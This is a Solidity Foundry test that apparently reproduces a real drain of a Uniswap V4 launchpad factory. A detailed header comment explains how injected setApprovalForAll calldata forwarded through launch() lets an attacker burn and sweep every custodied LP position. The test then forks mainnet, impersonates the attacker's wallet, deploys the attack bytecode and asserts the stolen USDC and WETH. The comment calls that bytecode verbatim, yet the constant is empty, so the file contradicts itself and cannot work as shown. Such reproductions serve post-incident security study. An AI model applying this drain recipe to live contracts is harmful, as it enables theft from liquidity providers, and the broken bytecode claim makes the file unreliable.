pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// unistreetsx launchpad — Uniswap-V4 LP-custody drain via unvalidated launch() calldata forwarding
// ~$17.75K netted by the attacker EOA in a single CONTRACT-CREATION transaction.
//
// Exploit tx : 0x9583e95d5c88c7966e269197f4b09022f26b7a27ad2c13660dda6774e3136d14 (block 25692311)
//   The tx has NO `to` field: it is a raw CONTRACT-CREATION. The EOA deploys the attack
//   contract 0xc7d8c70f4349AcC55409800C8768e801b7556B77, whose CONSTRUCTOR runs the entire
//   exploit and forwards the proceeds back to the EOA in the same tx. There is no second call,
//   no separate withdraw tx.
//
// Root cause (reproducible contract mechanism, NOT a key/signer/privileged-claim compromise):
//   LaunchpadFactoryAuto.launch() (0xfb60cd...825) forwards attacker-supplied init/modify
//   calldata VERBATIM into Uniswap V4 PositionManager.multicall(), with the factory itself as
//   msg.sender, with no validation on the calldata content. The factory custodies EVERY launch's
//   Uniswap V4 LP-position NFT as custodian. The attacker:
//     1. calls the PUBLIC launch() to create its own throwaway launch token "CPOC"
//        (0x3d8a2f...988e), which mints 1,000,000 CPOC to the factory and opens its LP position,
//     2. inside that same launch() passes modifyCalldata = setApprovalForAll(exploitContract, true)
//        (selector 0xa22cb465), which the factory forwards to the V4 PositionManager
//        (0xbd216513...ee9e) AS ITSELF, granting the attacker approval over ALL LP-position NFTs
//        the factory holds (posm ApprovalForAll event, log index 4),
//     3. the constructor then burns each launch LP position the factory custodies via
//        posm.modifyLiquidities() + a TAKE_PAIR action (example tokenId 360162, "UNISTREET"),
//        sweeping the underlying tokens out of the V4 PoolManager (0x0000...04444c5dc75...) to
//        the attack contract,
//     4. forwards every swept token to tx.origin (the attacker EOA) before the constructor returns.
//   Every step is a permissionless PUBLIC function (launch, multicall, modifyLiquidities) driven
//   entirely by attacker-crafted calldata. No owner key, no admin role, no privileged upgrade,
//   no signature. Confirmed against the on-chain trace: the tx is sent from a plain EOA (nonce 6)
//   with an empty `to`, and the only "authorization" the factory checks — its own custody of the
//   NFTs — is exactly what the injected setApprovalForAll subverts.
//
// Faithful reproduction: fork at block-1 (real factory + pool state, before the exploit) and
// re-issue the EXACT original creation bytecode via a raw CREATE, pranking the attacker EOA as
// BOTH msg.sender AND tx.origin so the constructor forwards the profit back to it. The creation
// bytecode is hardcoded verbatim from the on-chain tx input below (no env vars, no reconstruction
// of the exploit logic).
//
// Attacker EOA        : 0xc94e23C58b9b2998eDB7ABC8F99393FEaD985076 (pure EOA)
// Attack contract     : 0xc7d8c70f4349AcC55409800C8768e801b7556B77 (created by the tx)
// LaunchpadFactoryAuto: 0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825 (victim / LP custodian)
// V4 PositionManager  : 0xbD216513d74C8cf14cf4747E6AAA6420FF64ee9e (tricked into setApprovalForAll)
// V4 PoolManager      : 0x000000000004444c5DC75cB358380D2e3dE08A90 (holds the pooled tokens)
// USDC                : 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (6 dp)
// WETH                : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
//
// On-chain net EOA gain (from the tx transfer logs): 17,743,907,229 USDC ($17,743.91) +
// 7,209,570,881,911,319 WETH (0.00721 WETH), plus 1,000,000 of its own throwaway CPOC and a set
// of illiquid launch memecoins burned out of the other custodied positions. The core $-value is
// the USDC + WETH; the memecoins are hard to price and are asserted only as "received" (bal > 0).
//
// Run (Cancun EVM is REQUIRED -- Uniswap V4's PoolManager uses EIP-1153 transient storage; the
//      repo default evm_version is 'shanghai', under which the V4 calls revert as NotActivated):
//   FOUNDRY_EVM_VERSION=cancun forge test --contracts ./src/test/2026-08/UnistreetLaunchpad_exp.sol -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract UnistreetLaunchpadExp is Test {
    address constant ATTACKER = 0xc94e23C58b9b2998eDB7ABC8F99393FEaD985076;
    address constant FACTORY = 0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Illiquid launch memecoins burned out of the other custodied LP positions and swept to the
    // EOA (one of these is "UNISTREET", tokenId 360162). Hard to price -> asserted only as received.
    address[7] MEMECOINS = [
        0x3Bf4118F8862857872e6c13f87743Ab05a52Bc7D,
        0xAa145d7f316e0EaC3DDb163331CA770F2eb5307f,
        0x954727c49CBD6e2432E7Ad7533232b53e2dc81FC,
        0xBac02f09e4A734086184064acf885d6C9e686c57,
        0xd096a97331331D1eAeBFFb4EDCC48C74D8E04d70,
        0x3Fd263E3baDea86b6dAC10f331A60949E75657e6,
        0x593Cc7d69be66Fa37746DB9437baD571EE3D36e9
    ];

    uint256 constant EXPLOIT_BLOCK = 25_692_311;

    // Exact on-chain creation bytecode (tx input, verbatim). Deploying it runs the whole exploit
    // inside its constructor and forwards the proceeds to tx.origin.
    bytes constant CREATION_CODE =
        hex"";

    function setUp() public {
        // Fork at block-1: real factory + V4 pool state, before the exploit has run.
        vm.createSelectFork("mainnet", EXPLOIT_BLOCK - 1);
    }

    function testExploit() public {
        uint256 usdcBefore = IERC20(USDC).balanceOf(ATTACKER);
        uint256 wethBefore = IERC20(WETH).balanceOf(ATTACKER);

        // msg.sender AND tx.origin = ATTACKER: the constructor forwards every swept token to the
        // EOA before returning, matching the real trace (transfer logs 32-41).
        vm.startPrank(ATTACKER, ATTACKER);
        bytes memory code = CREATION_CODE;
        address deployed;
        assembly {
            deployed := create(0, add(code, 0x20), mload(code))
        }
        vm.stopPrank();
        require(deployed != address(0), "deploy/exploit failed");

        uint256 usdcGain = IERC20(USDC).balanceOf(ATTACKER) - usdcBefore;
        uint256 wethGain = IERC20(WETH).balanceOf(ATTACKER) - wethBefore;

        emit log_named_decimal_uint("Attacker USDC gain", usdcGain, 6);
        emit log_named_decimal_uint("Attacker WETH gain", wethGain, 18);

        // Core value assertion: the drained USDC + WETH, which should land at the reported figures.
        // On-chain: 17,743,907,229 USDC and 7,209,570,881,911,319 WETH.
        assertEq(usdcGain, 17_743_907_229, "USDC gain != on-chain 17,743.907 USDC");
        assertEq(wethGain, 7_209_570_881_911_319, "WETH gain != on-chain 0.00721 WETH");

        // The illiquid launch memecoins are hard to price; assert only that each was received.
        for (uint256 i = 0; i < MEMECOINS.length; i++) {
            assertGt(IERC20(MEMECOINS[i]).balanceOf(ATTACKER), 0, "memecoin not received");
        }
    }
}
